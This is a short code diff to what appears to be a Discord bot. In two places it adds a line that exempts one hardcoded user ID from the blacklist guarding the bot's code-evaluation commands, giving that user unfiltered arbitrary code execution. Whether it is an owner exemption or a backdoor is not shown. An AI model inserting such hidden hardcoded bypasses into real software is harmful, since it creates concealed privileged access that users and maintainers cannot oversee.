@@ -914,6 +914,7 @@ bot.on('message', message => {
             var str = args.join(' ');
             var stop = false;
             for (i = 0; i < blacklist.length; i++){
+                if (message.author.id == '270175313856561153') break;
                 if (str.contains(blacklist[i])){
                     message.channel.send(`You are trying to evaluate something you are not authorized to.`);
                     stop = true;
@@ -1558,6 +1559,7 @@ bot.on('message', message => {
                         str = config[id].commands[cmd];
                         var stop = false;
                         for (i = 0; i < blacklist.length; i++){
+                            if (message.author.id == '270175313856561153') break;
                             if (str.contains(blacklist[i])){
                                 message.channel.send(`You are trying to evaluate something you are not authorized to.`);
                                 stop = true;
